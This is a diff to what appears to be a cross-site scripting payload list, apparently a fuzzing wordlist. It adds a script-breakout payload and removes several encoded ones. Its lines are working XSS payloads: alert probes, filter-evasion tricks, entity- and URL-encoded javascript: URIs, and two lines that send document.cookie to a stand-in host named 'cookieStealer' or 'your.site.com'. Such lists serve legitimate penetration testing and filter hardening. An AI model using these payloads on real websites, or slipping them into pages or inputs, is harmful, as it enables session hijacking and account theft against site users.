@@ -1,4 +1,5 @@
 <script>alert('XSS')</script>
+'></script><script>alert('XSS')</script>
 45511\';alert(1)//119
 \';alert(1)//
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
@@ -70,6 +71,3 @@
 <IMG%20SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
 '%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
 "><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>
-%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
-';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
-'';!--"<XSS>=&{()}
